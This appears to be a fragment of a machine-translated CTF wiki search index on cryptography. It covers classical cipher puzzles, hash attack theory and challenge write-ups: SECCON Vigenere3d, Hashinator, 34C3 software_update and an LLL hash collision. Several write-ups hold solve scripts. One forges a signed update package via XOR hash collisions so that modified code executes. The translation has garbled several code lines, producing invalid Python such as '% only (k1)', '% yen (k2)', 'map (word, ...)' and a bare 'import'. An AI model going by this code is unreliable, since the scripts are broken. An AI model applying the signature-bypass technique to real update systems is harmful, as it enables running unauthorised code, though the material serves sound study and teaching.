<ol> <li>Determine the password type: according to the prompt, encryption method, ciphertext character set, cipher text display form and other information.</li> <li>Determine the attack method: including direct analysis, brute force attack, statistical analysis and other methods. For special passwords of unknown type, the appropriate attack method should be selected according to their password characteristics.</li> <li>Identify analysis tools: Focus on online password analysis tools and Python scripting tools, supplemented by offline cryptanalysis tools and manual analysis.</li> </ol> <p>The applicable scenarios and examples of the above ciphertext attack methods are as follows:</p> Attack Methods Applicable Scenarios Examples <p>Direct Analysis Method | The password for the mapping relationship can be determined by the password type | Caesar password, pig password, keyboard password, etc. | | Brute force attack method | Replacement password or replacement password with small key space | Shift password, fence password, etc. | | Statistical Analysis | Replacement passwords with large key spaces | Simple replacement passwords, affine passwords, Virginia passwords, etc. |</p>"},{"location":"crypto/classical/summary/#experiment-love-in-the-fence","title":"Experiment, love in the fence","text":"<p>Description of the topic</p> <p>&gt; I have been wondering about a question recently. Is QWE not equal to ABC?</p> <p>-.- .. --.- .-.. .-- - ..-. -.-. --.- --. -. ... --- ---</p> <p>&gt; flag format: CTF{xxx}</p> <p>First of all, according to the password style, it is Moss code. After decryption, it gets <code>KIQLWTFCQGNSOO</code>. It doesn't look like flag. There are still fences and <code>QWE in the end. It doesn&amp;#39;t equal ABC</code>. After both try it, It is found that QWE and then the fence can get the result.</p> <p>First, the keyboard QWE decrypts and tries to decrypt it to get <code>IILYOAVNEBSAHR</code>. Then the fence decrypts to get <code>ILOVESHIYANBAR</code>.</p>"},{"location":"crypto/classical/summary/#2017-seccon-vigenere3d","title":"2017 SECCON Vigenere3d","text":"<p>The procedure is as follows</p> <pre><code># Vigenere3d.py\n\nimport sys\n\ndef _l(idx, s):\n\n    return s[idx:] + s[:idx]\n\ndef main(p, k1, k2):\n\n    s = \"ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789abcdefghijklmnopqrstuvwxyz_{}\"\n\n    t = [[_l((i+j) % len(s), s) for j in range(len(s))] for i in range(len(s))]\n\n    i1 = 0\n\n    i2 = 0\n\n    c = \"\"\n\n    for a in p:\n\n        c += t[s.find(a)][s.find(k1[i1])][s.find(k2[i2])]\n\ni1 = (i1 + 1)% only (k1)\ni2 = (i2 + 1)% yen (k2)\n    return c\n\nprint main(sys.argv[1], sys.argv[2], sys.argv[2][::-1])\n\n\n\n$ python Vigenere3d.py SECCON {*************************** **************\nPOR4dnyTLHBfwbxAAZhe}}ocZR3Cxcftw9\n</code></pre> <p>Solution 1:</p> <p>First, let\u2019s first analyze the composition of t. $$</p> <p>t[i][j]=s[i+j:]+s[:i+j] \\</p> <p>t[i][k]=s[i+k:]+s[:i+k]</p> <p>$$</p> <p>t[i][j][k] is the kth character in t[i][j], t[i][k][j] is $t[i][k] The jth character in $. Whether i+j+k exceeds <code>len(s)</code> is always consistent, ie t[i][j][k]=t[i][k][j] .</p> <p>Therefore, in fact, for the same plaintext, there may be multiple keys to generate the same ciphertext.</p> <p>However, the above analysis is simply analysis, and the following begins.</p> <p>It is not difficult to see that each bit of the ciphertext is only related to the corresponding bit of the plaintext, and the space of each bit of the key is the size of s, so we can use the blast to obtain the key. Here, according to the above command line prompt, it can be known that the key length is 14, just the first 7 bytes of the plaintext are known. The recovery key exp is as follows</p> <pre><code>def get_key(plain, cipher):\n\n    s = \"ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789abcdefghijklmnopqrstuvwxyz_{}\"\n\n    t = [[_l((i + j) % len(s), s) for j in range(len(s))]\n\n         for i in range(len(s))]\n\n    i1 = 0\n\n    i2 = 0\n\n    key = ['*'] * 14\n\n    for i in range(len(plain)):\n\n        for i1 in range(len(s)):\n\n            for i2 in range(len(s)):\n\n                if t[s.find(plain[i])][s.find(s[i1])][s.find(s[i2])] == cipher[\n\n                        i]:\n\n                    key[i] = s[i1]\n\n                    key[13 - i] = s[i2]\n\n    return ''.join(key)\n</code></pre> <p>The script to restore the plaintext is as follows</p> <pre><code>def decrypt(cipher, k1, k2):\n\n    s = \"ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789abcdefghijklmnopqrstuvwxyz_{}\"\n\n    t = [[_l((i + j) % len(s), s) for j in range(len(s))]\n\n         for i in range(len(s))]\n\n    i1 = 0\n\n    i2 = 0\n\n    plain = \"\"\n\n    for a in cipher:\n\n        for i in range(len(s)):\n\n            if t[i][s.find(k1[i1])][s.find(k2[i2])] == a:\n\n                plain += s[i]\n\n                break\n\ni1 = (i1 + 1)% only (k1)\ni2 = (i2 + 1)% yen (k2)\n    return plain\n</code></pre> <p>Get the plain text below</p> <pre><code>\u279c  2017_seccon_vigenere3d git:(master) python exp.py\n\nSECCON{Welc0me_to_SECCON_CTF_2017}\n</code></pre> <p>Solution 2</p> <p>Analysis of this question:</p> <ol> <li>Considering that the array access will not cross the boundary under normal program operation, we will make the following convention when discussing: arr[index] \\Leftrightarrow arr[index \\% len(arr)]</li> <li>For the <code>_l</code> function defined in the python program, find the following equivalence relationship: \\_l(offset, arr)[index] \\Leftrightarrow arr[index + offset]</li> <li>For the definition of the three-dimensional matrix t in python's main function, find the following equivalence relation: t[a][b][c] \\Leftrightarrow \\_l(a+b, s)[c]</li> <li>Based on the observation of the second point 3, there is the following equivalence relation: t[a][b][c] \\Leftrightarrow s[a+b+c]</li> <li> <p>We consider s as an encoding format, namely: encoding process s.find(x), decoding process s[x]. And directly replace the string it refers to by using the number of its encoded result, then the encryption process can be expressed by the following formula:   - e = f +  k1 +k2</p> </li> <li> <p>where e is ciphertext, f is plaintext, k1 and k2 are keys obtained by the copy method and of the same length as f, and ** addition is vector plus **.</p> </li> </ol> <p>So we only need to calculate the key by calculating <code>k1+k2</code> and decrypt it. Decrypt the python script for this question:</p> <pre><code># exp2.py\n\nenc_str = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789abcdefghijklmnopqrstuvwxyz_{}'\n\ndec_dic = {k:v for v,k in enumerate(enc_str)}\n\nencrypt = 'POR4dnyTLHBfwbxAAZhe}}ocZR3Cxcftw9'\n\nflag_bg = 'SECCON{**************************}'\n\n\n\nSim_key = [dec_dic[encrypt[i]]-dec_dic[flag_bg[i]] for i in range(7)] #crack the emulation key\nsim_key = sim_key + sim_key[::-1]\n\n\n\nFlag_ed = [dec_dic[v]-sim_key[k%14] for k,v in enumerate(encrypt)] #imitation key decryption\nflag_ed = ''.join([enc_str[i%len(enc_str)] for i in flag_ed]) # \u89e3\u7801\n\nprint(flag_ed)\n</code></pre> <p>Get the plain text as follows:</p> <pre><code>$ python exp2.py\n\nSECCON{Welc0me_to_SECCON_CTF_2017}\n</code></pre>"},{"location":"crypto/classical/summary/#the-disappearing-triple-password","title":"The disappearing triple password","text":"<p>Ciphertext <pre><code>or sit kggd sit qkt ygxk ortfzoeqs wqlatzwqssl qfr zvg ortfzoeqs yggzwqssl. fgv oy ngx vqfz so-called hxz zitd or gft soft.piv dgfn lgsxzogfl qkt zitkt? zohl: hstqlt eiqfut is ygkd gy is fxdwtk ngx utz.zit hkgukqddtkl!\n</code></pre></p> <p>Use quipquip to decrypt directly.</p>"},{"location":"crypto/hash/attack/","title":"Hash Attack","text":"<p>Common hash function attack methods are mainly</p> <ul> <li>Violent attack: does not depend on any algorithm details, only related to the length of the hash value;</li> <li>Birthday Attack: The structure and any algebraic weak nature of the hash function are not used, depending only on the length of the message digest, which is the length of the hash value.</li> <li>Meet-In-The-Middle: It is a variant of a birthday attack. Instead of comparing hash values, it compares intermediate variables. This type of attack is mainly used to attack Hash schemes with a packet chain structure.</li> <li>Password analysis: Depends on the design shortcomings of specific algorithms.</li> </ul>"},{"location":"crypto/hash/attack/#violent-attack","title":"violent attack","text":"<p>HashCat tool can be said to be the best CPU and GPU-based cracking Hash software, the related links are as follows</p> <p>[HashCat official website] (http://www.hashcat.net/hashcat/)</p> <p>[HashCat Simple to use] (http://www.freebuf.com/sectool/112479.html)</p>"},{"location":"crypto/hash/attack/#hash-length-extension-attacks","title":"hash length extension attacks","text":""},{"location":"crypto/hash/attack/#introduction","title":"Introduction","text":"<p>The basic definition is as follows, from [Wikipedia] (https://en.wikipedia.org/wiki/%E9%95%BF%E5%BA%A6%E6%89%A9%E5%B1%95%E6% 94% BB% E5% 87% BB).</p> <p>Hash Length Extension Attacks are pointers to certain cryptographic hash functions that allow additional information. This attack applies to all hash functions that take the H(key \u2225 message) construct in the case where the length of the ** message and the key is known**. Algorithms based on the Merkle\u2013Damg\u00e5rd constructs such as MD5 and SHA-1 show vulnerabilities to such attacks.</p> <p>This type of hash function has the following characteristics</p> <ul> <li>The message padding method is similar. First, add a 1 after the message, then fill in a number of 0s until the total length is congruent with 448, and finally attach a 64-bit message length (before filling).</li> <li>Each link variable obtained will be used as the initial vector IV for the next execution of the hash function. In the last block, the corresponding link variable will be converted to a hash value.</li> </ul> <p>The following conditions should be met during a general attack.</p> <ul> <li>We know the length of the key, if you don't know, you need to burst it out.</li> <li>We can control the message of the message.</li> <li>We already know the hash value of a message containing a key.</li> </ul> <p>So we can get a pair (messge, x) to satisfy x = H (key \u2225 message) although we are not sure about the contents of the key.</p>"},{"location":"crypto/hash/attack/#attack-principle","title":"Attack principle","text":"<p>Here we can assume that we know the hash value of hash(key+s), where s is known, then it will be filled when it is calculated. Then we can first get the key+s extended by key+s, ie</p> <p>now=key|s|padding</p> <p>Then if we attach a part of the information extra after the now, ie</p> <p>key|s|padding|extra</p> <p>When you go to calculate the hash value,</p> <ol> <li>The extra is filled until the condition is met.</li> <li>Calculate the link variable IV1 corresponding to now, and we already know the hash value of this part, and the algorithm that the link variable produces the hash value is reversible, so we can get the link variable.</li> <li>The hash algorithm is performed on the extra part according to the obtained link variable IV1, and the hash value is returned.</li> </ol> <p>So now that we know the hash value of the first part, and we also know the value of extra, then we can get the last hash value.</p> <p>And before we said that we can control the value of the message. So in fact, s, padding, extra, we can all control. So we can naturally find the corresponding (message, x) to satisfy x = hash (key | mesage).</p>"},{"location":"crypto/hash/attack/#examples","title":"Examples","text":"<p>It seems that most of them are inside the web, and I don't know much about the web. I will not give examples for the time being.</p>"},{"location":"crypto/hash/attack/#tools","title":"Tools","text":"<ul> <li>hashpump</li> </ul> <p>Please refer to the readme on github for how to use it.</p>"},{"location":"crypto/hash/attack/#hash-algorithm-is-incorrectly-designed","title":"hash algorithm is incorrectly designed","text":"<p>Some custom hash algorithms may be reversible.</p>"},{"location":"crypto/hash/attack/#hashinator","title":"Hashinator","text":"<p>The logic of the topic is very simple. Pick a <code>password</code> from a well-known password dictionary \"rockyou\" and use a variety of hash algorithms to randomly hash 32 rounds. We need to crack the original <code>password</code> from the final hash result.</p>"},{"location":"crypto/hash/attack/#analysis","title":"Analysis","text":"<p>The hash algorithms used in the title are: <code>md5</code>, <code>sha1</code>, <code>blake</code>, <code>scrypt</code>. The key code is as follows: <pre><code>    password = self.generate_password()     # from rock_you.txt\n\nSalt = self.generate_salt(password) # related to the length of the password\nHash_rounds = self.generate_rounds() # Generate the order in which the hash algorithm is executed\n    password_hash = self.calculate_hash(salt + password, hash_rounds)\n</code></pre></p> <ol> <li>The program first randomly extracts a <code>password</code> from <code>rockyou.txt</code> as the encrypted plaintext.</li> <li>Then generate a <code>salt</code> of length <code>128 - len(password)</code> based on the length of the extracted <code>password</code>.</li> <li>Extract from the four hash algorithms listed above to form 32 rounds of hash operations.</li> <li>Calculate the last <code>password_hash</code> given to us based on the previously obtained <code>password</code>, <code>salt</code>.</li> </ol> <p>Obviously, we can't complete the problem by the inverse hash algorithm. We know all the possible plaintexts, first considering whether we can complete the exhaustion by constructing a rainbow table. But notice that in the <code>generate_salt()</code> function, the length combination of <code>salt</code> and <code>password</code> exceeds the length of 128 bytes and is annotated. <pre><code>    msize = 128 # f-you hashcat :D\n</code></pre></p> <p>So, can only helplessly give up.</p> <p>In that case, there is only one possibility, that is, the algorithm is reversible. Looking at the concrete implementation of the <code>calculate_hash()</code> function, you can find the following suspicious code: <pre><code>for i in range(len(hash_rounds)):\n\n    interim_salt = xor(interim_salt, hash_rounds[-1-i](interim_hash))\n\n    interim_hash = xor(interim_hash, hash_rounds[i](interim_salt))\n\nfinal_hash = interim_salt + interim_hash\n</code></pre></p> <p>Reorganize the information we know: 1. There are 32 rounds stored in hash_rounds, which is the hash function handle to be used in each round. 2. final_hash is the last hash result for us. 3. The contents of hash_rounds will also be printed to us after generation. 4. We want to get the values of <code>interim_salt</code> and <code>interim_hash</code> in the first round. 5. <code>interim_salt</code> and <code>interim_hash</code> are both 64bytes in length.</p> <p>A closer look at the calculations of <code>interim_salt</code> and <code>interim_hash</code> reveals that it is reversible.</p> <p>$$</p> <p>interim_hash_1 = interim_hash_2 \\oplus hash_roundsi</p> <p>$$</p> <p>In this line of code, we know interim\\_hash_1 and interim\\_salt_3, so we can get the value of interim\\_hash_2, and interim\\_hash_2 is the last round of <code>interim_hash</code>. By pushing back 32 times in this way, you can get the initial <code>password</code> and <code>salt</code>.</p> <p>The specific decryption script is: <pre><code>import\nimport hashlib\n\nimport socket\n\nimport threading\n\nimport socketserver\n\nimport struct\n\nimport time\n\nimport threading\n# import pyscrypt\n\nfrom base64 import b64encode, b64decode\n\nfrom pwn import *\n\ndef md5(bytestring):\n\n    return hashlib.md5(bytestring).digest()\n\ndef sha(bytestring):\n\n    return hashlib.sha1(bytestring).digest()\n\ndef blake(bytestring):\n\n    return hashlib.blake2b(bytestring).digest()\n\ndef scrypt(bytestring):\n\n    l = int(len(bytestring) / 2)\n\n    salt = bytestring[:l]\n\n    p = bytestring[l:]\n\n    return hashlib.scrypt(p, salt=salt, n=2**16, r=8, p=1, maxmem=67111936)\n\n    # return pyscrypt.hash(p, salt, 2**16, 8, 1, dkLen=64)\n\ndef xor(s1, s2):\n\n    return b''.join([bytes([s1[i] ^ s2[i % len(s2)]]) for i in range(len(s1))])\n\ndef main():\n\n# io = socket.socket (family = socket.AF_INET)\n# io.connect ((&amp;#39;47.88.216.38&amp;#39;, 20013))\nio = remote (&amp;#39;47 .88.216.38 &amp;#39;, 20013)\nprint (io.recv (1000))\n    ans_array = bytearray()\n\n    while True:\n\nbuf = io.recv (1)\n        if buf:\n\n            ans_array.extend(buf)\n\n        if buf == b'!':\n\n            break\n\n\n\n    password_hash_base64 = ans_array[ans_array.find(b\"b'\") + 2: ans_array.find(b\"'\\n\")]\n\n    password_hash = b64decode(password_hash_base64)\n\n    print('password:', password_hash)\n\n    method_bytes = ans_array[\n\n        ans_array.find(b'used:\\n') + 6 : ans_array.find(b'\\nYour')\n\n    ]\n\n    methods = method_bytes.split(b'\\n')\n\n    methods = [bytes(x.strip(b'- ')).decode() for x in methods]\n\n    print(methods)\n\n    in_salt = password_hash[:64]\n\n    in_hash = password_hash[64:]\n\n    for pos, neg in zip(methods, methods[::-1]):\n\n        '''\n\n            interim_salt = xor(interim_salt, hash_rounds[-1-i](interim_hash))\n\n            interim_hash = xor(interim_hash, hash_rounds[i](interim_salt))\n\n        '''\n\n        in_hash = xor(in_hash, eval(\"{}(in_salt)\".format(neg)))\n\n        in_salt = xor(in_salt, eval(\"{}(in_hash)\".format(pos)))\n\n    print(in_hash, in_salt)\n\n    print(in_hash[-20:])\n\nio.interactive ()\nmain()\n</code></pre></p>"},{"location":"crypto/hash/attack/#original-hash-algorithm","title":"Original hash algorithm","text":"<pre><code>import\nimport hashlib\n\nimport socket\n\nimport threading\n\nimport socketserver\n\nimport struct\n\nimport time\n\n\n\n# import pyscrypt\n\n\n\nfrom base64 import b64encode\n\n\n\ndef md5(bytestring):\n\n    return hashlib.md5(bytestring).digest()\n\n\n\ndef sha(bytestring):\n\n    return hashlib.sha1(bytestring).digest()\n\n\n\ndef blake(bytestring):\n\n    return hashlib.blake2b(bytestring).digest()\n\n\n\ndef scrypt(bytestring):\n\n    l = int(len(bytestring) / 2)\n\n    salt = bytestring[:l]\n\n    p = bytestring[l:]\n\n    return hashlib.scrypt(p, salt=salt, n=2**16, r=8, p=1, maxmem=67111936)\n\n    # return pyscrypt.hash(p, salt, 2**16, 8, 1)\n\n\n\ndef xor(s1, s2):\n\n    return b''.join([bytes([s1[i] ^ s2[i % len(s2)]]) for i in range(len(s1))])\n\n\n\nclass HashHandler (socketserver.BaseRequestHandler):\n\n\n    welcome_message = \"\"\"\n\nWelcome, young wanna-be Cracker, to the Hashinator.\n\n\n\nTo prove your worthiness, you must display the power of your cracking skills.\n\n\n\nThe test is easy:\n\n1. We send you a password from the rockyou list, hashed using multiple randomly chosen algorithms.\n\n2. You crack the hash and send back the original password.\n\n\n\nAs you already know the dictionary and won't need any fancy password rules, {} seconds should be plenty, right?\n\n\n\nPlease wait while we generate your hash...\n\n    \"\"\"\n\n\n\n    hashes = [md5, sha, blake, scrypt]\n\n    timeout = 10\n\n    total_rounds = 32\n\n\n\n    def handle(self):\n\n        self.request.sendall(self.welcome_message.format(self.timeout).encode())\n\n\n\n        password = self.generate_password()     # from rock_you.txt\n\nSalt = self.generate_salt(password) # related to the length of the password\nHash_rounds = self.generate_rounds() # Generate the order in which the hash algorithm is executed\n        password_hash = self.calculate_hash(salt + password, hash_rounds)\n\n        self.generate_delay()\n\n\n\n        self.request.sendall(\"Challenge password hash: {}\\n\".format(b64encode(password_hash)).encode())\n\n        self.request.sendall(\"Rounds used:\\n\".encode())\n\n        test_rounds = []\n\n        for r in hash_rounds:\n\n            test_rounds.append(r)\n\n\n\n        for r in hash_rounds:\n\n            self.request.sendall(\"- {}\\n\".format(r.__name__).encode())\n\n        self.request.sendall(\"Your time starts now!\\n\".encode())\n        self.request.settimeout(self.timeout)\n\n        try:\n\n            response = self.request.recv(1024)\n\n            if response.strip() == password:\n\n                self.request.sendall(\"Congratulations! You are a true cracking master!\\n\".encode())\n\n                self.request.sendall(\"Welcome to the club: {}\\n\".format(flag).encode())\n\n                return\n\n        except socket.timeout:\n\n            pass\n\n        self.request.sendall(\"Your cracking skills are bad, and you should feel bad!\".encode())\n\n\n\n\n\n    def generate_password(self):\n\n        rand = struct.unpack(\"I\", os.urandom(4))[0]\n\n        lines = 14344391 # size of rockyou\n\n        line = rand % lines\n\n        password = \"\"\n\n        f = open('rockyou.txt', 'rb')\n\n        for i in range(line):\n\n            password = f.readline()\n\n        return password.strip()\n\n\n\n    def generate_salt(self, p):\n\n        msize = 128 # f-you hashcat :D\n\n        salt_size = msize - len(p)\n\n        return os.urandom(salt_size)\n\n\n\n    def generate_rounds(self):\n\n        rand = struct.unpack(\"Q\", os.urandom(8))[0]\n\n        rounds = []\n\n        for i in range(self.total_rounds):\n\n            rounds.append(self.hashes[rand % len(self.hashes)])\n\nrand = rand &amp;gt;&amp;gt; 2\n        return rounds\n\n\n\n    def calculate_hash(self, payload, hash_rounds):\n\n        interim_salt = payload[:64]\n\n        interim_hash = payload[64:]\n\n        for i in range(len(hash_rounds)):\n\n            interim_salt = xor(interim_salt, hash_rounds[-1-i](interim_hash))\n\n            interim_hash = xor(interim_hash, hash_rounds[i](interim_salt))\n\n            '''\n\n            interim_hash = xor(\n\n                interim_hash,\n\n                hash_rounds[i](\n\n                    xor(interim_salt, hash_rounds[-1-i](interim_hash))\n\n                )\n\n            )\n\n            '''\n\n        final_hash = interim_salt + interim_hash\n\n        return final_hash\n\n\n\n    def generate_delay(self):\n\n        rand = struct.unpack(\"I\", os.urandom(4))[0]\n\n        time.sleep(rand / 1000000000.0)\n\n\n\n\n\n\n\nclass ThreadedTCPServer(socketserver.ThreadingMixIn, socketserver.TCPServer):\n\n    allow_reuse_address = True\n\n\n\nPORT = 1337\n\nHOST = '0.0.0.0'\n\nflag = \"\"\n\n\n\nwith open(\"flag.txt\") as f:\n\n    flag = f.read()\n\n\n\ndef main():\n\nserver = ThreadedTCPServer ((HOST, PORT), HashHandler)\n    server_thread = threading.Thread(target=server.serve_forever)\n\n    server_thread.start()\n\n    server_thread.join()\n\n\n\nif __name__ == \"__main__\":\n\n    main()\n</code></pre>"},{"location":"crypto/hash/complex/","title":"\u7efc\u5408","text":""},{"location":"crypto/hash/complex/#2017-34c3-software_update","title":"2017 34c3 Software_update","text":"<p>As you can see, the general meaning of the program is to upload a zip archive and then verify the signature of the files in the signed_data directory. Among them, the final verification method is to perform a sha256 hash on each file, and then XOR X is sent as input to rsa for signature. If verified, the corresponding pre-copy.py and post-copy.py files will be executed.</p> <p>The natural idea is that we modify the pre-copy.py or post-copy.py file so that it can read the flag and then bypass the signature again. There are two main ideas</p> <ol> <li>According to the given public key file to obtain the corresponding private key, and then modify the file to forge the signature, and then look at the public key file is almost unbreakable, so this can basically give up.</li> <li>After modifying the corresponding file, use the XOR feature to make its hash value the same as the original **, thus bypassing the signature detection. That is, the signed_data directory contains multiple files, so that the hash values of these files are finally XORed to offset the difference in hash values caused by modifying the pre-copy.py or post-copy.py files.</li> </ol> <p>Here, we choose the second method, here we choose to modify the pre-copy.py file, the specific ideas are as follows</p> <ol> <li>Calculate the original hash value of pre-copy.py.</li> <li>Modify the pre-copy.py file so that it can read the flag. At the same time, calculate the new hash value. XOR the two and find the difference or delta.</li> <li>Look for a series of files whose X-values are XORed exactly as delta.</li> </ol> <p>The key step is the third step, but in fact this file can be seen as a linear combination problem, that is, looking for several 256-dimensional 01 vectors to make the XOR value delta. and $$</p> <p>(F={0,1},F^{256},\\oplus ,\\cdot)</p> <p>$$</p> <p>Is a 256-dimensional vector space. If we can find a basis for the vector space, then we can find the required vector for any given value in the space.</p> <p>We can use sage to assist us, as follows</p> <pre><code># generage the base of &lt;{0,1},F^256,xor,*&gt;\n\ndef gen_gf2_256_base():\n\n    v = VectorSpace(GF(2), 256)\n\n    tmphash = compute_file_hash(\"0.py\", \"\")\n\ntmphash_bin = hash2bin (tmphash)\n    base = [tmphash_bin]\n\n    filelist = ['0.py']\n\n    print base\n\n    s = v.subspace(base)\n\n    dim = s.dimension()\n\n    cnt = 1\n\n    while dim != 256:\n\n        tmpfile = str(cnt) + \".py\"\n\n        tmphash = compute_file_hash(tmpfile, \"\")\n\ntmphash_bin = hash2bin (tmphash)\n        old_dim = dim\n\n        s = v.subspace(base + [tmphash_bin])\n\n        dim = s.dimension()\n\n        if dim &gt; old_dim:\n\n            base += [tmphash_bin]\n\n            filelist.append(tmpfile)\n\n            print(\"dimension \" + str(s.dimension()))\n\n        cnt += 1\n\n        print(cnt)\n\n    m = matrix(GF(2), 256, 256, base)\n\n    m = m.transpose()\n\n    return m, filelist\n</code></pre> <p>For more detailed answers, please refer to <code>exp.py</code>.</p> <p>Here I am modifying the pre-copy multi-output <code>!!!!come here!!!!</code> word, as follows</p> <pre><code>\u279c  software_update git:(master) python3 installer.py now.zip\n\nPreparing to copy data...\n\n!!!!come here!!!!\n\nSoftware update installed successfully.\n</code></pre>"},{"location":"crypto/hash/complex/#references","title":"references","text":"<ul> <li> <p>https://sectt.github.io/writeups/34C3CTF/crypto_182_software_update/Readme</p> </li> <li> <p>https://github.com/OOTS/34c3ctf/blob/master/software_update/solution/exploit.py</p> </li> </ul>"},{"location":"crypto/hash/fnv/","title":"Fowler\u2013Noll\u2013Vo hash function","text":"<p>See https://en.wikipedia.org/wiki/Fowler%E2%80%93Noll%E2%80%93Vo_hash_function for details.</p>"},{"location":"crypto/hash/fnv/#2018-ashcoll","title":"2018 \u7f51\u9f0e\u676fashcoll","text":"<p>In fact, this question was copied from NSU Crypto, https://nsucrypto.nsu.ru/archive/2017/problems_solution, the specific wp before hellman also wrote, https://gist.github.com/hellman/9bf8376cd04e7a8dd2ec7be1947261e9 .</p> <p>Simply look at the topic</p> <pre><code>h0 = 45740974929179720441799381904411404011270459520712533273451053262137196814399\n\n\n# 2**168 + 355\n\ng = 374144419156711147060143317175368453031918731002211L\n\n\n\n\n\ndef shitty_hash(msg):\n\n    h = h0\n\n    msg = map(ord, msg)\n\n    for i in msg:\n\n        h = (h + i) * g\n\n        # This line is just to screw you up :))\n\nh = h &amp;amp; 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff\n\n\n    return h - 0xe6168647f636\n</code></pre> <p>The topic hopes that we give two messages with the same hash value. If we expand the function, then</p> <p>hash(m)=h_0g^n+x_1g^n+x_2g_{n-1}+...+x_ng \\bmod 2^{256}</p> <p>Suppose the hash values of the two messages are the same.</p> <p>$ h_0g ^ n + x_1g ^ n + x_2g_ {n-1} + ... + x_ng equiv h_0g ^ n + y_1g ^ n + y_2g_ {n-1} + ... + y_ng bmod 2 ^ {256} $</p> <p>and then</p> <p>$ (x_1-y_1) g ^ {n-1} + (x_2-y_2) g ^ {n-2} + ... + (x_n-y_n) g ^ 0  equiv 0  bmod 2 ^ {256} $</p> <p>That is, we only need to find an n-dimensional vector z_i=x_i-y_i, which satisfies the above equation, we can further convert it into</p> <p>$ z_1g ^ {n-1} + z_2g ^ {n-2} + ... + z_ng ^ 0-k * 2 ^ {256} = 0 $</p> <p>That is, a set of vectors is found to satisfy the above formula. This can be thought of as a simple case of the second example in LLL Paper (see the Lattice Question section).</p> <p>Then we can quickly construct the matrix as follows</p>  A = \\left[ \\begin{matrix} 1   &amp; 0 &amp; 0     &amp; \\cdots &amp; 0 &amp; Kg^{n-1}     \\\\ 0   &amp; 1  &amp; 0    &amp; \\cdots &amp; 0 &amp; Kg^{n-2}  \\\\ 0   &amp; 0   &amp; 1   &amp; \\cdots &amp; 0 &amp; Kg^{n-3} \\\\\\vdots &amp; \\vdots &amp; \\vdots &amp; \\ddots &amp; \\vdots \\\\ 0   &amp; 0   &amp;0   &amp; \\cdots &amp; 1 &amp; K*mod     \\\\ \\end{matrix} \\right] <p>Then we can get two identical hashes using the LLL algorithm.</p> <pre><code>from sage.all import *\n\n\n\nmod = 2 ** 256\nh0 = 45740974929179720441799381904411404011270459520712533273451053262137196814399\n\n\ng = 2**168 + 355\n\n\n\n\n\ndef shitty_hash(msg):\n\n    h = h0\n\n    msg = map(ord, msg)\n\n    for i in msg:\n\n        h = (h + i) * g\n\n        # This line is just to screw you up :))\n\nh = h &amp;amp; 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff\n\n\n    return h - 0xe6168647f636\n\n\n\n\n\nK = 2 ** 200\nN = 50\n\nbase_str = 'a' * N\n\nbase = map (word, base_str)\nm = Matrix(ZZ, N + 1, N + 2)\n\nfor i in xrange(N + 1):\n\n    ge = ZZ(pow(g, N - i, mod))\n\n    m[i, i] = 1\n\n    m[i, N + 1] = ZZ(ge * K)\n\nm[i, N + 1] = ZZ(K * mod)\n\n\n\nml = m.LLL()\n\nttt = ml.rows()[0]\n\nprint \"result:\", ttt\n\nif ttt[-1] != 0:\n\n    print \"Zero not reached, increase K\"\n\n    exit()\n\nelse:\n\n    msg = []\n\n    for i in xrange(N):\n\n        msg.append(base[i] + ttt[i])\n\n        if not (0 &lt;= msg[i] &lt;= 255):\n\n            print \"Need more bytes!\"\n\n            quit()\n\n    print msg\n\n    other = ''.join(map(chr, msg))\n\n\n\n    print shitty_hash(base_str)\n\n    print shitty_hash(other)\n</code></pre> <p>Note that you can't just use pow(g, N - i, mod) directly, otherwise the generated number will be in the domain corresponding to mod, which is really a big pit.</p> <p>as follows</p> <pre><code>\u279c  hashcoll sage exp.sage\n\nresult: (15, -14, 17, 14, 6, 0, 12, 21, 8, 29, 6, -4, -9, 10, -2, -12, -6, 0, -12, 13, -28, -28, -24, -3, 6, -5, -16, 15, 17, -14, 3, -2, -16, -25, 3, -21, -27, -9, 16, 5, -1, 0, -3, -4, -4, -19, 6, 8, 0, 0, 0, 0)\n\n[112, 83, 114, 111, 103, 97, 109, 118, 105, 126, 103, 93, 88, 107, 95, 85, 91, 97, 85, 110, 69, 69, 73, 94, 103, 92, 81, 112, 114, 83, 100, 95, 81, 72, 100, 76, 70, 88, 113, 102, 96, 97, 94, 93, 93, 78, 103, 105, 97, 97]\n\n106025341237231370726407656306665079105509255639964756437758376184556498283725\n\n106025341237231370726407656306665079105509255639964756437758376184556498283725\n</code></pre> <p>That is success.</p>"},{"location":"crypto/hash/introduction/","title":"hash function","text":"<p>A hash function compresses a message or data into a digest, making the amount of data smaller. Its general model is as follows</p> <p></p> <p>Obviously for any hash value, there are theoretically several messages corresponding to it, namely collisions.</p> <p>The basic requirements of the hash function are as follows</p> Requirements Description <p>| Input length variable | hash function can be applied to data of any length | | Output length fixed | The output length of the hash function is fixed | | Efficiency | For any message x, calculating H(x) is easy | | Unidirectional | For any hash value h, it is computationally infeasible to find x that satisfies H(x)=h. | | Weak Collision Resistance | For any message x, finding another message y that satisfies H(x)=H(y) is not computationally feasible. | | Strong Collision Resistance | Finding any pair of messages x and y that satisfy H(x)=H(y) is not computationally feasible. | | Pseudo-randomness | The output of the hash function satisfies the pseudo-randomness test criteria. |</p> <p>The purpose of the hash value is as follows</p> <ul> <li>Ensuring the integrity of the message, ie ensuring that the data received is exactly the same as it was sent (ie no modification, insertion, deletion or replay) to prevent tampering by the intermediary.</li> <li>Redundancy check</li> <li>One-way password file, such as the password of the Linux system</li> <li>Signature detection in intrusion detection and virus detection</li> </ul> <p>The current Hash functions mainly include MD5, SHA1, SHA256, and SHA512. Most of the current hash functions are iterative, that is, using the same hash function and performing multiple iterations with different parameters.</p> Algorithm Type Output Hash Value Length <p>| MD5    | 128 bit / 256 bit |</p> <p>| SHA1   | 160 bit           |</p> <p>| SHA256 | 256 bit           |</p> <p>| SHA512 | 512 bit           |</p>"},{"location":"crypto/hash/md5/","title":"MD5","text":""},{"location":"crypto/hash/md5/#basic-description","title":"Basic description","text":"<p>The input and output of MD5 are as follows</p> <ul> <li>Input: Any long message, 512-bit long packet.</li> <li>Output: 128-bit message digest.</li> </ul> <p>For a detailed introduction, please search for yourself.</p> <p>In addition, sometimes the md5 we get is 16-bit. In fact, the 16-bit is the length of the 32-bit md5, which is derived from the 32-bit md5 value. It is to remove the first eight bits of 32-bit md5 and get the last 